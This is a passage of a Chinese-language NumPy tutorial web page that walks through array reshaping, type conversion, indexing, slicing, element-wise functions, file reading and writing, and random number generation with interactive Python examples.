<h3 id="swapaxes"><a href="#swapaxes" class="headerlink" title="swapaxes"></a>swapaxes</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]</span><br><span class="line"> [ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>,<span class="number">4</span>)).swapaxes(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">[[ <span class="number">0</span>  <span class="number">4</span>  <span class="number">8</span>]</span><br><span class="line"> [ <span class="number">1</span>  <span class="number">5</span>  <span class="number">9</span>]</span><br><span class="line"> [ <span class="number">2</span>  <span class="number">6</span> <span class="number">10</span>]</span><br><span class="line"> [ <span class="number">3</span>  <span class="number">7</span> <span class="number">11</span>]]</span><br></pre></td></tr></table></figure>

<h3 id="flatten"><a href="#flatten" class="headerlink" title="flatten"></a>flatten</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>,<span class="number">4</span>)).flatten()</span><br><span class="line">[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]</span><br></pre></td></tr></table></figure>

<h2 id="ndarray变换类型"><a href="#ndarray变换类型" class="headerlink" title="ndarray变换类型"></a>ndarray变换类型</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>g = np.arange(<span class="number">12</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g.dtype</span><br><span class="line">dtype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> g</span><br><span class="line">[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g.astype(np.<span class="built_in">float</span>)</span><br><span class="line">array([  <span class="number">0.</span>,   <span class="number">1.</span>,   <span class="number">2.</span>,   <span class="number">3.</span>,   <span class="number">4.</span>,   <span class="number">5.</span>,   <span class="number">6.</span>,   <span class="number">7.</span>,   <span class="number">8.</span>,   <span class="number">9.</span>,  <span class="number">10.</span>,</span><br><span class="line">        <span class="number">11.</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> g</span><br><span class="line">[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>  <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]</span><br></pre></td></tr></table></figure>

<p>使用<code>.astype</code>改变Array数据类型，并不改变原数组的数据类型。</p>
<h2 id="NumPy数组转换成Python列表"><a href="#NumPy数组转换成Python列表" class="headerlink" title="NumPy数组转换成Python列表"></a>NumPy数组转换成Python列表</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(g)</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(g.tolist())</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>g.tolist()</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]</span><br></pre></td></tr></table></figure>

<h2 id="ndarray获取操作"><a href="#ndarray获取操作" class="headerlink" title="ndarray获取操作"></a>ndarray获取操作</h2><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>h = np.arange(<span class="number">24</span>).reshape((<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> h</span><br><span class="line">[[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>]</span><br><span class="line">  [ <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line">  [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line"> [[<span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]</span><br><span class="line">  [<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span>]</span><br><span class="line">  [<span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>h[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="number">23</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>h[-<span class="number">1</span>,-<span class="number">2</span>,-<span class="number">3</span>]</span><br><span class="line"><span class="number">17</span></span><br></pre></td></tr></table></figure>

<h3 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>h[:,<span class="number">1</span>,-<span class="number">3</span>]</span><br><span class="line">array([ <span class="number">5</span>, <span class="number">17</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>h[:,<span class="number">1</span>:<span class="number">3</span>,:]</span><br><span class="line">array([[[ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>h[:,:,::<span class="number">2</span>]</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">2</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">6</span>],</span><br><span class="line">        [ <span class="number">8</span>, <span class="number">10</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">12</span>, <span class="number">14</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">18</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">22</span>]]])</span><br></pre></td></tr></table></figure>

<h2 id="ndarray运算"><a href="#ndarray运算" class="headerlink" title="ndarray运算"></a>ndarray运算</h2><h3 id="与标量运算"><a href="#与标量运算" class="headerlink" title="与标量运算"></a>与标量运算</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>h / h.mean()</span><br><span class="line">array([[[ <span class="number">0.</span>        ,  <span class="number">0.08695652</span>,  <span class="number">0.17391304</span>,  <span class="number">0.26086957</span>],</span><br><span class="line">        [ <span class="number">0.34782609</span>,  <span class="number">0.43478261</span>,  <span class="number">0.52173913</span>,  <span class="number">0.60869565</span>],</span><br><span class="line">        [ <span class="number">0.69565217</span>,  <span class="number">0.7826087</span> ,  <span class="number">0.86956522</span>,  <span class="number">0.95652174</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">1.04347826</span>,  <span class="number">1.13043478</span>,  <span class="number">1.2173913</span> ,  <span class="number">1.30434783</span>],</span><br><span class="line">        [ <span class="number">1.39130435</span>,  <span class="number">1.47826087</span>,  <span class="number">1.56521739</span>,  <span class="number">1.65217391</span>],</span><br><span class="line">        [ <span class="number">1.73913043</span>,  <span class="number">1.82608696</span>,  <span class="number">1.91304348</span>,  <span class="number">2.</span>        ]]])</span><br></pre></td></tr></table></figure>

<h3 id="一元函数"><a href="#一元函数" class="headerlink" title="一元函数"></a>一元函数</h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">np.abs(x) np.fabs(x)</td>
<td align="left">计算元素的绝对值</td>
</tr>
<tr>
<td align="left">np.sqrt(x)</td>
<td align="left">计算元素的平方根</td>
</tr>
<tr>
<td align="left">np.square(x)</td>
<td align="left">计算元素的平方</td>
</tr>
<tr>
<td align="left">np.log(x) np.log10(x) np.log2(x)</td>
<td align="left">计算元素的自然对数、10为底、2为底对数</td>
</tr>
<tr>
<td align="left">np.ceil(x) np.floor(x)</td>
<td align="left">计算元素的ceiliing floor值</td>
</tr>
<tr>
<td align="left">np.rint(x)</td>
<td align="left">计算元素的四舍五入值</td>
</tr>
<tr>
<td align="left">np.modf(x)</td>
<td align="left">计算元素的小数和整数部分以两个独立的数组形式返回</td>
</tr>
<tr>
<td align="left">np.cos&#x2F;cosh&#x2F;sin&#x2F;sinh&#x2F;tan&#x2F;tanh(x)</td>
<td align="left">计算三角函数</td>
</tr>
<tr>
<td align="left">np.exp(x)</td>
<td align="left">计算元素的指数值</td>
</tr>
<tr>
<td align="left">np.sign(x)</td>
<td align="left">计算元素的符号值，1(+),0(0),-1(-)</td>
</tr>
</tbody></table>
<h3 id="二元函数"><a href="#二元函数" class="headerlink" title="二元函数"></a>二元函数</h3><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">+ - * &#x2F; **</td>
<td align="left">加、减、乘、除、幂</td>
</tr>
<tr>
<td align="left">np.maximum(x,y) np.fmax()</td>
<td align="left">取最大值</td>
</tr>
<tr>
<td align="left">np.minimum(x,y) np.fmin()</td>
<td align="left">取最小值</td>
</tr>
<tr>
<td align="left">np.mod(x,y)</td>
<td align="left">模运算</td>
</tr>
<tr>
<td align="left">np.copysign(x,y)</td>
<td align="left">将数组y中各元素的符号赋值给数组x对应的元素</td>
</tr>
<tr>
<td align="left">&gt; &lt; &gt;&#x3D; &lt;&#x3D; &#x3D;&#x3D; !&#x3D;</td>
<td align="left">产生布尔型数组</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>h &gt; (h/h.mean())</span><br><span class="line">array([[[<span class="literal">False</span>,  <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>],</span><br><span class="line">        [ <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>],</span><br><span class="line">        [ <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>],</span><br><span class="line">        [ <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>],</span><br><span class="line">        [ <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>,  <span class="literal">True</span>]]], dtype=<span class="built_in">bool</span>)</span><br></pre></td></tr></table></figure>

<h1 id="NumPy-I-O"><a href="#NumPy-I-O" class="headerlink" title="NumPy I&#x2F;O"></a>NumPy I&#x2F;O</h1><h2 id="CSV文件"><a href="#CSV文件" class="headerlink" title="CSV文件"></a>CSV文件</h2><p>*** CSV只能有效存储一维和二维数组 ***</p>
<h3 id="写入CSV文件"><a href="#写入CSV文件" class="headerlink" title="写入CSV文件"></a>写入CSV文件</h3><p><code>np.savetxt(frame, array, fmt=&#39;%.18e&#39;, delimiter=None)</code></p>
<ul>
<li>frame<br>  文件、字符串或产生器，可以是<code>.gz</code>或<code>.bz2</code>的压缩文件。</li>
<li>array<br>  存入文件的数组</li>
<li>fmt<br>  写入文件的格式，eg: %d %.2f %.18e</li>
<li>delimiter<br>  分割字符串，默认是空格。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.savetxt(<span class="string">&#x27;h.csv&#x27;</span>, h.reshape((<span class="number">3</span>,<span class="number">8</span>)), fmt=<span class="string">&quot;%d&quot;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> h.csv</span></span><br><span class="line">0,1,2,3,4,5,6,7</span><br><span class="line">8,9,10,11,12,13,14,15</span><br><span class="line">16,17,18,19,20,21,22,23</span><br></pre></td></tr></table></figure>

<h3 id="读取CSV文件"><a href="#读取CSV文件" class="headerlink" title="读取CSV文件"></a>读取CSV文件</h3><p><code>np.loadtxt(frame, dtype=np.float, delimiter=None, unpack=False)</code></p>
<ul>
<li>frame<br>  文件、字符串或产生器，可以是<code>.gz</code>或<code>.bz2</code>的压缩文件。</li>
<li>dtype<br>  数据类型，可选。</li>
<li>delimiter<br>  分割字符串，默认是空格。</li>
<li>unpack<br>  True，表示读入属性将分别写入不同变量。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.loadtxt(<span class="string">&#x27;h.csv&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">array([[  <span class="number">0.</span>,   <span class="number">1.</span>,   <span class="number">2.</span>,   <span class="number">3.</span>,   <span class="number">4.</span>,   <span class="number">5.</span>,   <span class="number">6.</span>,   <span class="number">7.</span>],</span><br><span class="line">       [  <span class="number">8.</span>,   <span class="number">9.</span>,  <span class="number">10.</span>,  <span class="number">11.</span>,  <span class="number">12.</span>,  <span class="number">13.</span>,  <span class="number">14.</span>,  <span class="number">15.</span>],</span><br><span class="line">       [ <span class="number">16.</span>,  <span class="number">17.</span>,  <span class="number">18.</span>,  <span class="number">19.</span>,  <span class="number">20.</span>,  <span class="number">21.</span>,  <span class="number">22.</span>,  <span class="number">23.</span>]])</span><br></pre></td></tr></table></figure>

<h2 id="多维度数据I-O"><a href="#多维度数据I-O" class="headerlink" title="多维度数据I&#x2F;O"></a>多维度数据I&#x2F;O</h2><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p><code>ndarray.tofile(frame, sep=&#39;&#39;, format=&#39;%s&#39;)</code></p>
<ul>
<li>frame<br>  文件，字符串</li>
<li>sep<br>  分割字符串，如果是空串，写入文件为二进制。</li>
<li>format<br>  写入数据的格式</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>h.tofile(<span class="string">&#x27;h.dat&#x27;</span>, sep=<span class="string">&#x27;,&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;%d&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> h.dat</span></span><br><span class="line">0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</span><br></pre></td></tr></table></figure>

<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p><code>np.fromfile(frame, dtype=np.float, count=-1, sep=&#39;&#39;)</code></p>
<ul>
<li>frame<br>  文件、字符串</li>
<li>dtype<br>  读取的数据类型</li>
<li>count<br>  读入元素个数，-1表示读入整个文件。</li>
<li>sep<br>  分割字符串，如果是空串，读取文件为二进制。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>h.tofile(<span class="string">&#x27;h.dat&#x27;</span>, sep=<span class="string">&#x27;,&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;%d&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.fromfile(<span class="string">&#x27;h.dat&#x27;</span>, dtype=np.<span class="built_in">int</span>, sep=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line">       <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.fromfile(<span class="string">&#x27;h.dat&#x27;</span>, dtype=np.<span class="built_in">int</span>, sep=<span class="string">&#x27;,&#x27;</span>).reshape((<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">       [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]])</span><br></pre></td></tr></table></figure>
<p>使用<code>fromfile</code>读取文件，需要知道数组的shape</p>
<h2 id="便捷文件读写"><a href="#便捷文件读写" class="headerlink" title="便捷文件读写"></a>便捷文件读写</h2><h3 id="写入文件-1"><a href="#写入文件-1" class="headerlink" title="写入文件"></a>写入文件</h3><p><code>np.save(frame, array)</code> or <code>np.savez(frame, array)</code></p>
<ul>
<li>frame<br>  文件名，以<code>.npy</code>为扩展名，压缩扩展名为<code>.npz</code></li>
<li>array<br>  数组变量</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.save(<span class="string">&#x27;h.npy&#x27;</span>,h)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> h.npy</span></span><br><span class="line">�NUMPYF&#123;&#x27;descr&#x27;: &#x27;&lt;i8&#x27;, &#x27;fortran_order&#x27;: False, &#x27;shape&#x27;: (2, 3, 4), &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="读取文件-1"><a href="#读取文件-1" class="headerlink" title="读取文件"></a>读取文件</h3><p><code>np.load(frame)</code></p>
<ul>
<li>frame<br>  文件名，以<code>.npy</code>为扩展名，压缩扩展名为<code>.npz</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.load(<span class="string">&#x27;h.npy&#x27;</span>)</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]]])</span><br></pre></td></tr></table></figure>

<h1 id="NumPy的随机函数"><a href="#NumPy的随机函数" class="headerlink" title="NumPy的随机函数"></a>NumPy的随机函数</h1><p><code>import numpy.random.*</code> or <code>np.random.rand()</code>、<code>np.random.randn()</code>、<code>np.random.randint()</code> …</p>
<h2 id="随机产生"><a href="#随机产生" class="headerlink" title="随机产生"></a>随机产生</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">rand(d0,d1…,dn)</td>
<td align="left">根据d0-dn创建随机数数组，浮点数，[0,1)，均匀分布</td>
</tr>
<tr>
<td align="left">randn(d0,d1…,dn)</td>
<td align="left">根据d0-dn创建随机数数组，标准正态分布</td>
</tr>
<tr>
<td align="left">randint(low[,high,shape])</td>
<td align="left">根据shape创建随机整数或整数数组，范围是[low,high)</td>
</tr>
<tr>
<td align="left">seed(s)</td>
<td align="left">随机数种子，s是给定的种子值</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.rand(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">array([[[ <span class="number">0.90829822</span>,  <span class="number">0.22946923</span>,  <span class="number">0.6652444</span> ,  <span class="number">0.99272168</span>],</span><br><span class="line">        [ <span class="number">0.06080758</span>,  <span class="number">0.44248097</span>,  <span class="number">0.93218605</span>,  <span class="number">0.52258628</span>],</span><br><span class="line">        [ <span class="number">0.72315102</span>,  <span class="number">0.15270485</span>,  <span class="number">0.78927709</span>,  <span class="number">0.69494654</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">0.35967592</span>,  <span class="number">0.94780636</span>,  <span class="number">0.70360292</span>,  <span class="number">0.78655759</span>],</span><br><span class="line">        [ <span class="number">0.99834954</span>,  <span class="number">0.5114802</span> ,  <span class="number">0.41374511</span>,  <span class="number">0.52093554</span>],</span><br><span class="line">        [ <span class="number">0.76139948</span>,  <span class="number">0.71690824</span>,  <span class="number">0.05146873</span>,  <span class="number">0.24752045</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.randn(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">array([[[ <span class="number">0.27215006</span>,  <span class="number">0.88541886</span>, -<span class="number">1.23316095</span>, -<span class="number">0.33090933</span>],</span><br><span class="line">        [-<span class="number">0.02253028</span>,  <span class="number">0.09407495</span>,  <span class="number">1.76527947</span>, -<span class="number">0.29149431</span>],</span><br><span class="line">        [-<span class="number">0.3821042</span> ,  <span class="number">0.29664845</span>, -<span class="number">0.73678807</span>, -<span class="number">1.0182318</span> ]],</span><br><span class="line"></span><br><span class="line">       [[-<span class="number">0.46816445</span>, -<span class="number">1.62242958</span>, -<span class="number">0.98800274</span>,  <span class="number">0.5167897</span> ],</span><br><span class="line">        [-<span class="number">0.14876304</span>,  <span class="number">0.60325633</span>, -<span class="number">1.22824121</span>,  <span class="number">1.40063683</span>],</span><br><span class="line">        [ <span class="number">0.7508062</span> ,  <span class="number">0.42850387</span>,  <span class="number">0.67736631</span>,  <span class="number">0.68300665</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.randint(<span class="number">50</span>,<span class="number">80</span>,(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">array([[[<span class="number">67</span>, <span class="number">79</span>, <span class="number">65</span>, <span class="number">56</span>],</span><br><span class="line">        [<span class="number">76</span>, <span class="number">60</span>, <span class="number">58</span>, <span class="number">70</span>],</span><br><span class="line">        [<span class="number">74</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">71</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">72</span>, <span class="number">67</span>, <span class="number">61</span>, <span class="number">53</span>],</span><br><span class="line">        [<span class="number">58</span>, <span class="number">66</span>, <span class="number">52</span>, <span class="number">69</span>],</span><br><span class="line">        [<span class="number">60</span>, <span class="number">70</span>, <span class="number">73</span>, <span class="number">64</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.seed(<span class="number">1111</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.randint(<span class="number">50</span>,<span class="number">80</span>,(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">array([[[<span class="number">78</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">67</span>],</span><br><span class="line">        [<span class="number">62</span>, <span class="number">52</span>, <span class="number">70</span>, <span class="number">74</span>],</span><br><span class="line">        [<span class="number">72</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">64</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">58</span>, <span class="number">56</span>, <span class="number">62</span>, <span class="number">64</span>],</span><br><span class="line">        [<span class="number">68</span>, <span class="number">72</span>, <span class="number">58</span>, <span class="number">59</span>],</span><br><span class="line">        [<span class="number">79</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">62</span>]]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.seed(<span class="number">1111</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.random.randint(<span class="number">50</span>,<span class="number">80</span>,(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">array([[[<span class="number">78</span>, <span class="number">73</span>, <span class="number">55</span>, <span class="number">67</span>],</span><br><span class="line">        [<span class="number">62</span>, <span class="number">52</span>, <span class="number">70</span>, <span class="number">74</span>],</span><br><span class="line">        [<span class="number">72</span>, <span class="number">70</span>, <span class="number">61</span>, <span class="number">64</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">58</span>, <span class="number">56</span>, <span class="number">62</span>, <span class="number">64</span>],</span><br><span class="line">        [<span class="number">68</span>, <span class="number">72</span>, <span class="number">58</span>, <span class="number">59</span>],</span><br><span class="line">        [<span class="number">79</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">62</span>]]])</span><br></pre></td></tr></table></figure>

<h2 id="随机排序拾取"><a href="#随机排序拾取" class="headerlink" title="随机排序拾取"></a>随机排序拾取</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">shuffle(a)</td>
<td align="left">对数组a按照最外维度进行随机排列，数组a改变</td>
</tr>
<tr>
<td align="left">permutation(a)</td>
<td align="left">对数组a按照最外维度进行随机排列，数组a不改变，生成新数组</td>
</tr>
<tr>
<td align="left">choice(a[,size,replace,p])</td>
<td align="left">从一维数组中以概率p抽取元素，形成size形状新数组，replace表示是否重复抽取(默认True)</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>i = h.reshape((<span class="number">3</span>,<span class="number">8</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> i</span><br><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]</span><br><span class="line"> [<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> np.random.permutation(i)</span><br><span class="line">[[ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]</span><br><span class="line"> [<span class="number">16</span> <span class="number">17</span> <span class="number">18</span> <span class="number">19</span> <span class="number">20</span> <span class="number">21</span> <span class="number">22</span> <span class="number">23</span>]</span><br><span class="line"> [ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> i</span><br><span class="line">[[ <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>]</span><br><span class="line"> [ <span class="number">8</span>  <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span>]</span><br><span class="line"> [<span class="number">16</span> <span class="number">17</span> <span 